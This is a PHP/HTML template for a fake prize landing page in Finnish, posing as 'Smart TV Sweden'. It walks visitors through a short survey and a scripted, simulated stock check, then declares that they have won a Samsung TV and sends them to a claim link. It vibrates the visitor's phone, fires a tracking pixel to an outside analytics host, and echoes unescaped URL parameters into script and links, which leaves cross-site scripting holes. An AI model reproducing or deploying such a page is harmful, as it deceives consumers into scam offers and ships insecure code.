<?php
					$ulbid = NULL;
					$email= NULL;
					$iframe= NULL;
					if(isset($_GET["ulbid"])){
						
						if (strpos($options[0]['button_url'], '?') !== FALSE){
							$ulbid = '&ulbid='.$_GET["ulbid"];
						}else{
							$ulbid = '?ulbid='.$_GET["ulbid"];
						}
						$iframe = $options[0]['iframe_url'].$ulbid;
						if(isset($_GET["email"])){
							if (strpos($options[0]['button_url'], '?') !== FALSE){
								$email= '&email='.$_GET['email'];
							}else{
								$email= '?email='.$_GET['email'];
							}
						}
					}
					if (strpos($options[0]['button_url'], '?') !== FALSE){
					$buttonURL = $options[0]['button_url'].'&'.$_SERVER["QUERY_STRING"];
				}else{
					$buttonURL = $options[0]['button_url'].'?'.$_SERVER["QUERY_STRING"];
				}
					?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<meta name="viewport" content="width=device-width, user-scalable=false; initial-scale=1.0; maximum-scale=1.0">
		<title>Smart Tv Sverige</title>
		<link href="<?php echo base_url()?>assets/globalimgcdn/css/style.css" rel="stylesheet" type="text/css">
		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js" type="text/javascript"></script>
		<script type="text/javascript">
			var dayNames = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
			var monthNames = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
			var now = new Date();
			var today = monthNames[now.getMonth()] + " " + now.getDate() + ", " + now.getFullYear();

			function get_date(days) {
				return today = monthNames[now.getMonth()] + " " + (now.getDate() - days) + ", " + now.getFullYear();
			}
		</script>
		<script>
			$(document).ready(function() {
				$(".bq1").click(function() {
					$("#q1").fadeOut(0);
					$("#q2").fadeIn(500);
				});

				$(".bq2").click(function() {
					$("#q2").fadeOut(0);
					$("#q3").fadeIn(500);
				});

				$(".bq3").click(function() {
					$("#q3").fadeOut(0);
					$("#q4").fadeIn(500);
				});

				$(".bq4").click(function() {
					$("#content1").fadeOut(0);
					$("#content2").fadeIn();
					setTimeout(function() {
						$("#result1").fadeIn(1000);
					}, 3000);
					setTimeout(function() {
						$("#result2").fadeIn(1000);
					}, 4500);
					setTimeout(function() {
						$("#result3").fadeIn(1000);
					}, 5500);
					setTimeout(function() {
						$("#result4").fadeIn(1000);
					}, 6500);
					setTimeout(function() {
						$("#result5").fadeIn(1000);
					}, 7500);
					setTimeout(function() {
						$("#result6").fadeIn(1000);
					}, 8500);

					setTimeout(function() {
						$("#content2").fadeOut();
					}, 10500);
					setTimeout(function() {
						$("#content3").fadeIn();
					}, 10500);
				});
			});
		</script>
	</head>
	<body>
		<script type="text/javascript">
			navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
			navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000]);
		</script>
		<script>
			//alert("");
		</script>
		<div class="top"></div>
		<div class="content">

			<div class="main-content" id="content1">
				<div class="logo">

				</div>
				<div class="topbox">
					<h2 style=" text-align:center; color:#fff;"><strong>ONNEA!</strong></h2>
					<h4 style="color:#fff;">Sinut on valittu osallistumaan hienoon tutkimukseen!</h4>
					<p>
						Smart TV Sweden on palkittu vuoden 2015 Parhaana Elektroniikkakauppana
					</p>
					<p>
						Juhliaksemme tätä, annamme palkintoja voittajille, jotka ovat minkä tahansa 75 sijainnin lähellä
					</p>
					<p>
						Olet onnekas, koska postinumerosi perusteella saat tämän sähköpostin! Vastaathan kaikkiin kysymyksiin ja voit lunastaa palkintosi.
					</p>
					<p>
						Samsung 55'' UHD SMART LED-TV arvoltaan 1166 €
					</p>
					<p>
						Toimi nopeasti! Rajallinen varasto!
					</p>
				</div>

				<div class="mid_box">
					<div id="q1">
						<p class="question">
							<strong>K1:</strong> Kuinka usein olet ostanut tuotteen Smart TV Sweden elektroniikkakaupasta tänä vuonna?
						</p>
						<div class="button1 bq1">
							0-4 kertaa
						</div>
						<div class="button1 bq1">
							5-10 kertaa
						</div>
						<div class="button1 bq1">
							Enemmän kuin 10 kertaa
						</div>
					</div>

					<div id="q2">
						<p class="question">
							<strong>K2:</strong> Mistä elektroniikkamerkeistä pidät eniten?
						</p>
						<div class="button1 bq2">
							Philips
						</div>
						<div class="button1 bq2">
							Samsung
						</div>
						<div class="button1 bq2">
							Panasonic
						</div>
						<div class="button1 bq2">
							LG
						</div>
						<div class="button1 bq2">
							Sony
						</div>
						<div class="button1 bq2">
							Sharp
						</div>
						<div class="button1 bq2">
							Ei mikään yllä olevista
						</div>
					</div>

					<div id="q3">
						<p class="question">
							<strong>K3:</strong>  Miten yleensä maksat ostoksesi?
						</p>
						<div class="button1 bq3">
							Käteinen
						</div>
						<div class="button1 bq3">
							Lasku
						</div>
						<div class="button1 bq3">
							Pankkikortti
						</div>
						<div class="button1 bq3">
							Luottokortti
						</div>
					</div>

					<div id="q4">
						<p class="question">
							<strong>K4:</strong> Miten arvioisit asiakaspalvelumme?
						</p>
						<div class="button1 bq4">
							1.5
						</div>
						<div class="button1 bq4">
							2.5
						</div>
						<div class="button1 bq4">
							3.5
						</div>
						<div class="button1 bq4">
							4.5
						</div>
						<div class="button1 bq4">
							5.5
						</div>
					</div>
				</div>

			</div>
			<div class="main-content" id="content2">
				<h1 style="text-align:center;">Odotathan, että tarkistamme varastoa…</h1>
				<p class="loading"><img src="<?php echo base_url()?>assets/globalimgcdn/img/loading.gif">
				</p>
				<p class="result" id="result1">
					1/4….Huomioitu
				</p>
				<p class="result" id="result2">
					2/4….Huomioitu
				</p>
				<p class="result" id="result3">
					3/4….Huomioitu
				</p>
				<p class="result" id="result4">
					4/4….Huomioitu
				</p>
				<p class="result" id="result5">
					Tuplarekisteröintiä ei löytynyt
				</p>
				<p class="result" id="result6">
					Edelleen useita televisioita on saatavilla
				</p>
			</div>

			<div class="main-content" id="content3">
				<div class="logo">
					<img src="<?php echo base_url()?>assets/globalimgcdn/img/logo.png">
				</div>
				<div class="topbox">
					<h2 style="text-align:center; color:#fff;"><strong>ONNEA!</strong></h2>
					<h2 style="text-align:center; color:#fff;"><strong>Olet voittanut uuden Samsung 55'' UHD SMART LED-TV:n</strong></h2>
				</div>
				<div class="prize">
					<img width="100%" src="<?php echo base_url()?>assets/globalimgcdn/img/9tvfi.png">
				</div>
				
				<a href="<?php echo $buttonURL;?>" class="claim">
				<div class="button1">
					Lunasta palkintosi täällä
				</div></a>

			</div>
			<center>
				Tämän kilpailun on tarjonnut GoSkilly, ei Smart TV Sweden
			</center>
		</div>

		<script type="text/javascript">
	(new Image()).src='<?php echo '//condoative.com/analytics/setWcookie?route='.$_GET['route'].'&ulbid='.$_GET['ulbid']?>';
</script>
	</body>
</html>
